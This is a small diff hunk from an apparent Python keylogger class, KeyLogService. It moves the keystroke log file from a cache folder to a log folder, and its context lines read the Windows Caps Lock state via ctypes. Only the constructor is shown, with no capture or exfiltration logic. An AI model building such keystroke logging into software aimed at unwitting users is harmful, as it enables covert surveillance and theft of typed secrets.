@@ -3,7 +3,7 @@ import os, ctypes, threading
 
 class KeyLogService:
     def __init__(self):
-        self.path = os.path.join(os.path.dirname(__file__), "..\\cache\\keylog.txt")
+        self.path = os.path.join(os.path.dirname(__file__), "..\\log\\keylog.txt")
         self.caps = ctypes.windll.user32.GetKeyState(0x14) & 0x0001 != 0
         self.hooked = None
 
